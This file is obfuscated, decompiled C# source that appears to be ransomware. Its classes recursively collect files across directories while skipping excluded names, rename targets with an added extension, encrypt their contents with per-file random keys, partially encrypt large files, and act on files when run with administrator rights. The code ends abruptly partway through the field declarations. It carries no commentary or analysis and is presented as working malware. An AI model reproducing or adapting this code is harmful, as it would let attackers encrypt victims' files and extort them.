using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using ceQNxnERCANV;

namespace oXSOOyVgTNm;

internal sealed class NuHMiFuRoVNiZNRl
{
	public sealed class rHbafUcUytwV
	{
		private static StringCollection EjUeTtkrRXkfi;

		private static List<string> LcWjvHWSmPSauh;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107402079));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107402074)) && !text.ToLower().Contains(getString_0(107402085)) && !text.ToLower().Contains(getString_0(107388531)) && !text.ToLower().Contains(getString_0(107388550)) && !text.ToLower().Contains(getString_0(107402040)) && !text.ToLower().Contains(getString_0(107388910)) && !text.ToLower().Contains(getString_0(107388819)) && !text.ToLower().Contains(getString_0(107388834)) && !text.ToLower().Contains(getString_0(107388817)) && !text.ToLower().Contains(getString_0(107388256)) && !text.ToLower().Contains(getString_0(107388222)) && !text.ToLower().Contains(getString_0(107388237)) && !text.ToLower().Contains(getString_0(107388188)) && !text.ToLower().Contains(getString_0(107388207)) && !text.ToLower().Contains(getString_0(107388154)) && !text.ToLower().Contains(getString_0(107388173)) && !text.ToLower().Contains(getString_0(107388128)) && !text.ToLower().Contains(getString_0(107388143)) && !text.ToLower().Contains(getString_0(107388094)) && !text.Contains(VrSebPGaWq(getString_0(107388109))) && !text.Contains(getString_0(107388052)) && !text.Contains(getString_0(107388022)) && !text.EndsWith(getString_0(107395634)) && !text.EndsWith(getString_0(107388509)) && !text.EndsWith(getString_0(107388504)) && !text.EndsWith(getString_0(107388499)) && !text.EndsWith(getString_0(107388526)) && !text.ToLower().Contains(getString_0(107388521)) && !text.ToLower().Contains(whnxscRWcwiws))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(BMAroKfuhFq) * 1024.0 * 1024.0 && mkEvtBjNwVAcYow == getString_0(107397213))
							{
								LcWjvHWSmPSauh.Add(text);
							}
							else if (File.Exists(text) && mkEvtBjNwVAcYow == getString_0(107396738))
							{
								LcWjvHWSmPSauh.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return LcWjvHWSmPSauh;
		}

		static rHbafUcUytwV()
		{
			Strings.CreateGetStringDelegate(typeof(rHbafUcUytwV));
			EjUeTtkrRXkfi = new StringCollection();
			LcWjvHWSmPSauh = new List<string>();
		}
	}

	private sealed class jnZpVnhRGZ
	{
		public string qGLzZmNRcXPhs;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == qGLzZmNRcXPhs;
		}
	}

	private sealed class dKFlEjeuaGmF
	{
		private sealed class HQfrsIQrOMUPAw
		{
			public dKFlEjeuaGmF rOzAvbfwESYWLf;

			public string uxZFQGzScS;

			public void _003CCrypt_003Eb__1e()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					CHNqSdIclpz(WindowsIdentity.GetCurrent().Name, uxZFQGzScS);
				}
			}

			public void _003CCrypt_003Eb__1f()
			{
				SXrhZQJaTUl(uxZFQGzScS, rOzAvbfwESYWLf.CFydVPUKSVwwfR, rOzAvbfwESYWLf.HgEhetuptAI, rOzAvbfwESYWLf.bsNROZsFSfpd, rOzAvbfwESYWLf.pRUTpPeXmJ);
			}
		}

		public string[] CFydVPUKSVwwfR;

		public string[] bsNROZsFSfpd;

		public string pRUTpPeXmJ;

		public string HgEhetuptAI;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1d(string string_0)
		{
			HQfrsIQrOMUPAw CS_0024_003C_003E8__locals0 = new HQfrsIQrOMUPAw();
			CS_0024_003C_003E8__locals0.rOzAvbfwESYWLf = this;
			CS_0024_003C_003E8__locals0.uxZFQGzScS = string_0;
			if (NlpTotdSTrdumik && !ASbXtPMgHzag().Contains(getString_0(107385221)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						CHNqSdIclpz(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.uxZFQGzScS);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (kzoXfhpDPa == getString_0(107397219))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					SXrhZQJaTUl(CS_0024_003C_003E8__locals0.uxZFQGzScS, CS_0024_003C_003E8__locals0.rOzAvbfwESYWLf.CFydVPUKSVwwfR, CS_0024_003C_003E8__locals0.rOzAvbfwESYWLf.HgEhetuptAI, CS_0024_003C_003E8__locals0.rOzAvbfwESYWLf.bsNROZsFSfpd, CS_0024_003C_003E8__locals0.rOzAvbfwESYWLf.pRUTpPeXmJ);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				SXrhZQJaTUl(CS_0024_003C_003E8__locals0.uxZFQGzScS, CFydVPUKSVwwfR, HgEhetuptAI, bsNROZsFSfpd, pRUTpPeXmJ);
			}
		}

		static dKFlEjeuaGmF()
		{
			Strings.CreateGetStringDelegate(typeof(dKFlEjeuaGmF));
		}
	}

	private sealed class NxhNWBJwtfUuM
	{
		private sealed class GKKjkBoNtCxNXx
		{
			public NxhNWBJwtfUuM qwQEJmVzAZwQ;

			public string BrVGKZEEUR;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2b()
			{
				foreach (string item in reXUufgXsSe)
				{
					if (BrVGKZEEUR.ToLower().EndsWith(item + qwQEJmVzAZwQ.HIDOumbCVkTws) && qgDONLtRygbsG == getString_0(107397230))
					{
						if (Convert.ToInt32(GaDNrTSfQzpgUqH) * 1024 * 1024 > new FileInfo(BrVGKZEEUR).Length)
						{
							try
							{
								JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(getString_0(107389452), getString_0(107389447), getString_0(107389466), BrVGKZEEUR);
							}
							catch
							{
							}
						}
					}
					else if (BrVGKZEEUR.ToLower().EndsWith(item) && qgDONLtRygbsG == getString_0(107396755))
					{
						try
						{
							JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(getString_0(107389452), getString_0(107389447), getString_0(107389466), BrVGKZEEUR);
						}
						catch
						{
						}
					}
				}
			}

			static GKKjkBoNtCxNXx()
			{
				Strings.CreateGetStringDelegate(typeof(GKKjkBoNtCxNXx));
			}
		}

		private sealed class UPxHIfYdmYP
		{
			public NxhNWBJwtfUuM qwQEJmVzAZwQ;

			public string iGOKniihxHJ;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2d()
			{
				foreach (string item in reXUufgXsSe)
				{
					if (iGOKniihxHJ.ToLower().EndsWith(item + qwQEJmVzAZwQ.HIDOumbCVkTws) && qgDONLtRygbsG == getString_0(107397233))
					{
						if (Convert.ToInt32(GaDNrTSfQzpgUqH) * 1024 * 1024 > new FileInfo(iGOKniihxHJ).Length)
						{
							try
							{
								JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(getString_0(107389455), getString_0(107389450), getString_0(107389469), iGOKniihxHJ);
							}
							catch
							{
							}
						}
					}
					else if (iGOKniihxHJ.ToLower().EndsWith(item) && qgDONLtRygbsG == getString_0(107396758))
					{
						try
						{
							JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(getString_0(107389455), getString_0(107389450), getString_0(107389469), iGOKniihxHJ);
						}
						catch
						{
						}
					}
				}
			}

			static UPxHIfYdmYP()
			{
				Strings.CreateGetStringDelegate(typeof(UPxHIfYdmYP));
			}
		}

		public List<string> oVWAGhnvYra;

		public List<string> BdJvEtGXFodrl;

		public string HIDOumbCVkTws;

		public string[] yAYIsTKmrizA;

		public string KPzELoIiDOIaJ;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2a(string string_0)
		{
			GKKjkBoNtCxNXx CS_0024_003C_003E8__locals0;
			foreach (string item in BdJvEtGXFodrl)
			{
				if (yAYIsTKmrizA.Length != 0)
				{
					string[] array = yAYIsTKmrizA;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_078a;
					}
				}
				try
				{
					if (item.EndsWith(HIDOumbCVkTws))
					{
						goto IL_078a;
					}
				}
				catch (Exception)
				{
					goto IL_078a;
				}
				if (!item.EndsWith(string_0) || tYmlquEGMxfHN.Contains(item))
				{
					continue;
				}
				if (WlLLAxxAchpN == getString_0(107397227))
				{
					try
					{
						if (IVJqAYyIRPoOgC.SaxwKwUNxFPLf(item))
						{
							IVJqAYyIRPoOgC.KNsoUXkaLTo(item);
						}
					}
					catch
					{
					}
				}
				tYmlquEGMxfHN.Add(item);
				if (!GjyUHzrKYHxXFV.Contains(Path.GetDirectoryName(item)))
				{
					GjyUHzrKYHxXFV.Add(Path.GetDirectoryName(item));
				}
				DipEOSYYYUSt(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (sfIQAmNvQu)
						{
							try
							{
								File.AppendAllText(DFeZKWhzZEN, getString_0(107385395) + item + getString_0(107402069) + ex2.Message + getString_0(107396605));
							}
							catch (Exception)
							{
							}
						}
						OePGqyfYpLiYf++;
						goto end_IL_00ee;
					}
					if (CIfLKSlioN == getString_0(107397227) && new FileInfo(item).Length > Convert.ToInt32(mztBYJzvvrZxTt) * 1024 * 1024 && !oVWAGhnvYra.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new GKKjkBoNtCxNXx();
						CS_0024_003C_003E8__locals0.qwQEJmVzAZwQ = this;
						try
						{
							if (HIDOumbCVkTws != getString_0(107384627))
							{
								if (HITrlhSdkRhVnTG)
								{
									HIDOumbCVkTws = cIqGLYlhSzE + HIDOumbCVkTws;
								}
								File.Move(item, item + HIDOumbCVkTws);
							}
						}
						catch (Exception ex4)
						{
							if (sfIQAmNvQu)
							{
								try
								{
									File.AppendAllText(DFeZKWhzZEN, getString_0(107385395) + item + getString_0(107402008) + ex4.Message + getString_0(107396605));
								}
								catch (Exception)
								{
								}
							}
							OePGqyfYpLiYf++;
							goto end_IL_00ee;
						}
						CS_0024_003C_003E8__locals0.BrVGKZEEUR = getString_0(107389400);
						if (HIDOumbCVkTws != getString_0(107384627))
						{
							CS_0024_003C_003E8__locals0.BrVGKZEEUR = item + HIDOumbCVkTws;
						}
						else
						{
							CS_0024_003C_003E8__locals0.BrVGKZEEUR = item;
						}
						if (ZsMYnZdnVwqV == getString_0(107397227))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in reXUufgXsSe)
								{
									if (CS_0024_003C_003E8__locals0.BrVGKZEEUR.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.qwQEJmVzAZwQ.HIDOumbCVkTws) && qgDONLtRygbsG == GKKjkBoNtCxNXx.getString_0(107397230))
									{
										if (Convert.ToInt32(GaDNrTSfQzpgUqH) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.BrVGKZEEUR).Length)
										{
											try
											{
												JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(GKKjkBoNtCxNXx.getString_0(107389452), GKKjkBoNtCxNXx.getString_0(107389447), GKKjkBoNtCxNXx.getString_0(107389466), CS_0024_003C_003E8__locals0.BrVGKZEEUR);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.BrVGKZEEUR.ToLower().EndsWith(item2) && qgDONLtRygbsG == GKKjkBoNtCxNXx.getString_0(107396755))
									{
										try
										{
											JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(GKKjkBoNtCxNXx.getString_0(107389452), GKKjkBoNtCxNXx.getString_0(107389447), GKKjkBoNtCxNXx.getString_0(107389466), CS_0024_003C_003E8__locals0.BrVGKZEEUR);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = eLIwgixNfmLC.ChftDwvmoj(32);
						string s = uNKhrFAtKoRBVa.EnHLHyVjWIb(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (MrvhpQshaKLQlY == getString_0(107396752))
						{
							byte[] array2 = null;
							byte[] byte_ = xDMypKOxUD.DGMRcCHBjFbxJ(CS_0024_003C_003E8__locals0.BrVGKZEEUR, Convert.ToInt32(mztBYJzvvrZxTt) * 1024 * 1024);
							xDMypKOxUD.PerouGeIvmxU(AZdtlXlIbCEFkk: (!DseMmyGrBoOjezM) ? (OGOvpjxWqYzkk ? xDMypKOxUD.EmzieFXgUGooI(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : xDMypKOxUD.EmzieFXgUGooI(byte_, Encoding.ASCII.GetBytes(KPzELoIiDOIaJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (OGOvpjxWqYzkk ? RfklKQbYsGtli.zKFUoKSoRuLY(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : RfklKQbYsGtli.zKFUoKSoRuLY(byte_, Encoding.ASCII.GetBytes(KPzELoIiDOIaJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), SDWAgRRAQsnxQ: CS_0024_003C_003E8__locals0.BrVGKZEEUR, BbOGTxvaLAuDcV: bytes);
						}
						else if (!OGOvpjxWqYzkk)
						{
							bsHFtVGxaUZhONS.fymkhkKbxkbn(CS_0024_003C_003E8__locals0.BrVGKZEEUR, mztBYJzvvrZxTt, KPzELoIiDOIaJ);
						}
						else
						{
							bsHFtVGxaUZhONS.fymkhkKbxkbn(CS_0024_003C_003E8__locals0.BrVGKZEEUR, mztBYJzvvrZxTt, text, bytes);
						}
					}
					else
					{
						if (HITrlhSdkRhVnTG)
						{
							HIDOumbCVkTws = cIqGLYlhSzE + HIDOumbCVkTws;
						}
						string text2 = eLIwgixNfmLC.ChftDwvmoj(32);
						string s2 = uNKhrFAtKoRBVa.EnHLHyVjWIb(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (HIDOumbCVkTws != getString_0(107384627))
						{
							if (!ucaWVFkBOPmIjDGYC)
							{
								if (!OGOvpjxWqYzkk)
								{
									rOJiIraMDUnH(item, item + HIDOumbCVkTws, iJULqxXSwKAXP);
								}
								else
								{
									rOJiIraMDUnH(item, item + HIDOumbCVkTws, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!OGOvpjxWqYzkk)
									{
										TAoAasJVXJBG(item, item + HIDOumbCVkTws, iJULqxXSwKAXP);
									}
									else
									{
										TAoAasJVXJBG(item, item + HIDOumbCVkTws, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (sfIQAmNvQu)
									{
										try
										{
											File.AppendAllText(DFeZKWhzZEN, getString_0(107385395) + item + getString_0(107384581) + ex6.Message + getString_0(107396605));
										}
										catch (Exception)
										{
										}
									}
									OePGqyfYpLiYf++;
									goto end_IL_00ee;
								}
							}
						}
						else if (!ucaWVFkBOPmIjDGYC)
						{
							if (!OGOvpjxWqYzkk)
							{
								rOJiIraMDUnH(item, item + getString_0(107384590), iJULqxXSwKAXP);
							}
							else
							{
								rOJiIraMDUnH(item, item + getString_0(107384590), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!OGOvpjxWqYzkk)
								{
									TAoAasJVXJBG(item, item, iJULqxXSwKAXP);
								}
								else
								{
									TAoAasJVXJBG(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (sfIQAmNvQu)
								{
									try
									{
										File.AppendAllText(DFeZKWhzZEN, getString_0(107385395) + item + getString_0(107384581) + ex8.Message + getString_0(107396605));
									}
									catch (Exception)
									{
									}
								}
								OePGqyfYpLiYf++;
								goto end_IL_00ee;
							}
						}
						if (OGOvpjxWqYzkk)
						{
							if (HIDOumbCVkTws != getString_0(107384627))
							{
								lOMKHaCMphu(item + HIDOumbCVkTws, bytes2);
							}
							else
							{
								lOMKHaCMphu(item, bytes2);
							}
						}
					}
					goto IL_078a;
					end_IL_00ee:;
				}
				catch (Exception)
				{
					goto IL_078a;
				}
				continue;
				IL_078a:
				BdJvEtGXFodrl.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2c(string string_0)
		{
			UPxHIfYdmYP CS_0024_003C_003E8__locals0 = new UPxHIfYdmYP();
			CS_0024_003C_003E8__locals0.qwQEJmVzAZwQ = this;
			CS_0024_003C_003E8__locals0.iGOKniihxHJ = string_0;
			if (yAYIsTKmrizA.Length != 0)
			{
				string[] array = yAYIsTKmrizA;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.iGOKniihxHJ.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0817;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.iGOKniihxHJ.EndsWith(HIDOumbCVkTws))
				{
					goto IL_0817;
				}
			}
			catch (Exception)
			{
				goto IL_0817;
			}
			if (!tYmlquEGMxfHN.Contains(CS_0024_003C_003E8__locals0.iGOKniihxHJ))
			{
				if (WlLLAxxAchpN == getString_0(107397227))
				{
					try
					{
						if (IVJqAYyIRPoOgC.SaxwKwUNxFPLf(CS_0024_003C_003E8__locals0.iGOKniihxHJ))
						{
							IVJqAYyIRPoOgC.KNsoUXkaLTo(CS_0024_003C_003E8__locals0.iGOKniihxHJ);
						}
					}
					catch
					{
					}
				}
				tYmlquEGMxfHN.Add(CS_0024_003C_003E8__locals0.iGOKniihxHJ);
				if (!GjyUHzrKYHxXFV.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.iGOKniihxHJ)))
				{
					GjyUHzrKYHxXFV.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.iGOKniihxHJ));
				}
				DipEOSYYYUSt(CS_0024_003C_003E8__locals0.iGOKniihxHJ);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.iGOKniihxHJ).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (sfIQAmNvQu)
						{
							try
							{
								File.AppendAllText(DFeZKWhzZEN, getString_0(107385395) + CS_0024_003C_003E8__locals0.iGOKniihxHJ + getString_0(107402069) + ex2.Message + getString_0(107396605));
							}
							catch (Exception)
							{
							}
						}
						OePGqyfYpLiYf++;
						goto end_IL_0117_2;
					}
					if (CIfLKSlioN == getString_0(107397227) && new FileInfo(CS_0024_003C_003E8__locals0.iGOKniihxHJ).Length > Convert.ToInt32(mztBYJzvvrZxTt) * 1024 * 1024)
					{
						try
						{
							if (HIDOumbCVkTws != getString_0(107384627))
							{
								if (HITrlhSdkRhVnTG)
								{
									HIDOumbCVkTws = cIqGLYlhSzE + HIDOumbCVkTws;
								}
								File.Move(CS_0024_003C_003E8__locals0.iGOKniihxHJ, CS_0024_003C_003E8__locals0.iGOKniihxHJ + HIDOumbCVkTws);
							}
						}
						catch (Exception ex4)
						{
							if (sfIQAmNvQu)
							{
								try
								{
									File.AppendAllText(DFeZKWhzZEN, getString_0(107385395) + CS_0024_003C_003E8__locals0.iGOKniihxHJ + getString_0(107402008) + ex4.Message + getString_0(107396605));
								}
								catch (Exception)
								{
								}
							}
							OePGqyfYpLiYf++;
							return;
						}
						if (HIDOumbCVkTws != getString_0(107384627))
						{
							CS_0024_003C_003E8__locals0.iGOKniihxHJ += HIDOumbCVkTws;
						}
						if (ZsMYnZdnVwqV == getString_0(107397227))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in reXUufgXsSe)
								{
									if (CS_0024_003C_003E8__locals0.iGOKniihxHJ.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.qwQEJmVzAZwQ.HIDOumbCVkTws) && qgDONLtRygbsG == UPxHIfYdmYP.getString_0(107397233))
									{
										if (Convert.ToInt32(GaDNrTSfQzpgUqH) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.iGOKniihxHJ).Length)
										{
											try
											{
												JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(UPxHIfYdmYP.getString_0(107389455), UPxHIfYdmYP.getString_0(107389450), UPxHIfYdmYP.getString_0(107389469), CS_0024_003C_003E8__locals0.iGOKniihxHJ);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.iGOKniihxHJ.ToLower().EndsWith(item) && qgDONLtRygbsG == UPxHIfYdmYP.getString_0(107396758))
									{
										try
										{
											JVNsUrWNTuwEu.zPNMeddvbcVdbRzaZ(UPxHIfYdmYP.getString_0(107389455), UPxHIfYdmYP.getString_0(107389450), UPxHIfYdmYP.getString_0(107389469), CS_0024_003C_003E8__locals0.iGOKniihxHJ);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = eLIwgixNfmLC.ChftDwvmoj(32);
						string s = uNKhrFAtKoRBVa.EnHLHyVjWIb(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (MrvhpQshaKLQlY == getString_0(107396752))
						{
							byte[] array2 = null;
							byte[] byte_ = xDMypKOxUD.DGMRcCHBjFbxJ(CS_0024_003C_003E8__locals0.iGOKniihxHJ, Convert.ToInt32(mztBYJzvvrZxTt) * 1024 * 1024);
							xDMypKOxUD.PerouGeIvmxU(AZdtlXlIbCEFkk: (!DseMmyGrBoOjezM) ? (OGOvpjxWqYzkk ? xDMypKOxUD.EmzieFXgUGooI(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : xDMypKOxUD.EmzieFXgUGooI(byte_, Encoding.ASCII.GetBytes(KPzELoIiDOIaJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (OGOvpjxWqYzkk ? RfklKQbYsGtli.zKFUoKSoRuLY(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : RfklKQbYsGtli.zKFUoKSoRuLY(byte_, Encoding.ASCII.GetBytes(KPzELoIiDOIaJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), SDWAgRRAQsnxQ: CS_0024_003C_003E8__locals0.iGOKniihxHJ, BbOGTxvaLAuDcV: bytes);
						}
						else if (!OGOvpjxWqYzkk)
						{
							bsHFtVGxaUZhONS.fymkhkKbxkbn(CS_0024_003C_003E8__locals0.iGOKniihxHJ, mztBYJzvvrZxTt, KPzELoIiDOIaJ);
						}
						else
						{
							bsHFtVGxaUZhONS.fymkhkKbxkbn(CS_0024_003C_003E8__locals0.iGOKniihxHJ, mztBYJzvvrZxTt, text, bytes);
						}
					}
					else
					{
						if (HITrlhSdkRhVnTG)
						{
							HIDOumbCVkTws = cIqGLYlhSzE + HIDOumbCVkTws;
						}
						string text2 = eLIwgixNfmLC.ChftDwvmoj(32);
						string s2 = uNKhrFAtKoRBVa.EnHLHyVjWIb(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (HIDOumbCVkTws != getString_0(107384627))
						{
							if (!ucaWVFkBOPmIjDGYC)
							{
								if (!OGOvpjxWqYzkk)
								{
									rOJiIraMDUnH(CS_0024_003C_003E8__locals0.iGOKniihxHJ, CS_0024_003C_003E8__locals0.iGOKniihxHJ + HIDOumbCVkTws, iJULqxXSwKAXP);
								}
								else
								{
									rOJiIraMDUnH(CS_0024_003C_003E8__locals0.iGOKniihxHJ, CS_0024_003C_003E8__locals0.iGOKniihxHJ + HIDOumbCVkTws, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!OGOvpjxWqYzkk)
									{
										TAoAasJVXJBG(CS_0024_003C_003E8__locals0.iGOKniihxHJ, CS_0024_003C_003E8__locals0.iGOKniihxHJ + HIDOumbCVkTws, iJULqxXSwKAXP);
									}
									else
									{
										TAoAasJVXJBG(CS_0024_003C_003E8__locals0.iGOKniihxHJ, CS_0024_003C_003E8__locals0.iGOKniihxHJ + HIDOumbCVkTws, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (sfIQAmNvQu)
									{
										try
										{
											File.AppendAllText(DFeZKWhzZEN, getString_0(107385395) + CS_0024_003C_003E8__locals0.iGOKniihxHJ + getString_0(107384581) + ex6.Message + getString_0(107396605));
										}
										catch (Exception)
										{
										}
									}
									OePGqyfYpLiYf++;
									return;
								}
							}
						}
						else if (!ucaWVFkBOPmIjDGYC)
						{
							if (!OGOvpjxWqYzkk)
							{
								rOJiIraMDUnH(CS_0024_003C_003E8__locals0.iGOKniihxHJ, CS_0024_003C_003E8__locals0.iGOKniihxHJ + getString_0(107384590), iJULqxXSwKAXP);
							}
							else
							{
								rOJiIraMDUnH(CS_0024_003C_003E8__locals0.iGOKniihxHJ, CS_0024_003C_003E8__locals0.iGOKniihxHJ + getString_0(107384590), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!OGOvpjxWqYzkk)
								{
									TAoAasJVXJBG(CS_0024_003C_003E8__locals0.iGOKniihxHJ, CS_0024_003C_003E8__locals0.iGOKniihxHJ, iJULqxXSwKAXP);
								}
								else
								{
									TAoAasJVXJBG(CS_0024_003C_003E8__locals0.iGOKniihxHJ, CS_0024_003C_003E8__locals0.iGOKniihxHJ, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (sfIQAmNvQu)
								{
									try
									{
										File.AppendAllText(DFeZKWhzZEN, getString_0(107385395) + CS_0024_003C_003E8__locals0.iGOKniihxHJ + getString_0(107384581) + ex8.Message + getString_0(107396605));
									}
									catch (Exception)
									{
									}
								}
								OePGqyfYpLiYf++;
								return;
							}
						}
						if (OGOvpjxWqYzkk)
						{
							if (HIDOumbCVkTws != getString_0(107384627))
							{
								lOMKHaCMphu(CS_0024_003C_003E8__locals0.iGOKniihxHJ + HIDOumbCVkTws, bytes2);
							}
							else
							{
								lOMKHaCMphu(CS_0024_003C_003E8__locals0.iGOKniihxHJ, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0817;
			IL_0817:
			BdJvEtGXFodrl.Remove(CS_0024_003C_003E8__locals0.iGOKniihxHJ);
		}

		static NxhNWBJwtfUuM()
		{
			Strings.CreateGetStringDelegate(typeof(NxhNWBJwtfUuM));
		}
	}

	private sealed class rptFTrYiCvCjBm
	{
		public string mojxVTIvuJtPi;

		public string dGEtPIbqKFpIG;

		public void _003CEncrypt2_003Eb__3a()
		{
			while (true)
			{
				try
				{
					File.Delete(mojxVTIvuJtPi);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					if (File.Exists(dGEtPIbqKFpIG))
					{
						File.Delete(dGEtPIbqKFpIG);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string ojvJmSdPPrj;

	public static byte[] iJULqxXSwKAXP;

	public static string mkEvtBjNwVAcYow;

	public static string BMAroKfuhFq;

	public static List<string> lrbABqBtwmdm;

	public static List<string> mZgRSbczxJo;

	public static string aSWQFrNCstAYl;

	public static string KPzELoIiDOIaJ;

	public static string ldoNWMOouzwBgAly;

	public static string lybIEUIMcWIGlnj;

	public static int NxdceFBuPpPObn;

	public static string WlLLAxxAchpN;

	public static string rsKTwFdPlMVyG;

	public static string pbMZgWCLBnFVHk;

	public static string fBftGohOuN;

	public static string ojJyBCqzecG;

	public static string jbgOlLsBJBGC;

	public static string htRiLelItyC;

	public static string tTJxXJFQquIto;

	public static List<string> PJmgaEUVoKPG;

	public static List<string> GjyUHzrKYHxXFV;

	public static string ZCOzJLJFra;

	public static string tMeXcpeYzUQaWO;

	public static string ADeKtvlCUCyAWh;

	public static List<string> tYmlquEGMxfHN;

	public static string uFmZuDOsFxvzSHoZn;

	private static string gLqfzhShBbsaTtcB;

	public static string kzoXfhpDPa;

	public static string qweTdhHyyaxJwL;

	public static List<string> DDFbQjSRQSBi;

	public static List<string> GOxsnxWeRPgV;

	public static List<string> QiqXBfsbeQblN;

	public static List<string> bousYWjJeLmG;

	public static string vvPDaYXldwG;

	public static List<string> IhynlOzkYLrJ;

	public static List<string> QfFOzoRRsJbaCSrv;

	public static string fAKdbqEizNC;

	public static string unMozseWIfNDzIG;

	internal static DateTime ftLgdfTDcbcpVyc;

	internal static DateTime NqahqjARwnLy;

	public static string CIfLKSlioN;

	public static string mztBYJzvvrZxTt;

	public static string PuBOGNfOFfnPUU;

	public static string ZfGFDLzYRUVOYB;

